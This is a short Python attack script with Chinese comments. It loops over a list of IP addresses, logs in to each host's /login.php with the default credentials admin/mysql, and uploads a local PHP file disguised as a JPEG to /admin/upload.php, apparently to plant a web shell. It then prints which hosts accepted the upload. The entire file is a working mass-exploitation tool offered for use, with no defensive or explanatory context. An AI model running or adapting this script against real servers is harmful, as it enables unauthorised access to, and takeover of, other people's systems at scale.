import requests
f = open('ip.txt','r')
for i in f.readlines():

    URL = 'http://'+ i.strip()
    url_path = '/login.php'
    url_path1 = '/admin/upload.php'

    url = URL + url_path
    user_passwd = {'username':'admin',
        'password':'mysql',
        'button':'SIGN-I',}
    s=requests.Session()
    r=s.post(url,data=user_passwd)
    header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',}
    file ={
        'pic':('2.php',open('a.php','rb')),   #1.php这一块是文件名 ; pic也必须得改，是Content-Disposition: form-data; name="pic"; filename="php_mmr.php"
        'Content-Disposition':'form-data',
        'Content-Type':'image/jpeg',
    }
    url = URL + url_path1

    r1 = s.post(url = url, files=file,headers=header)
    r1.encoding = r1.apparent_encoding
    if r1.status_code != 200:
        print(url + '    \033[1;31m上传失败\033[0m')
    else :
        for i in r1.text.split('\n'):
            if '上传成功' in i:
                print(url + '    \033[1;32m上传成功\033[0m   ' + i)
                break

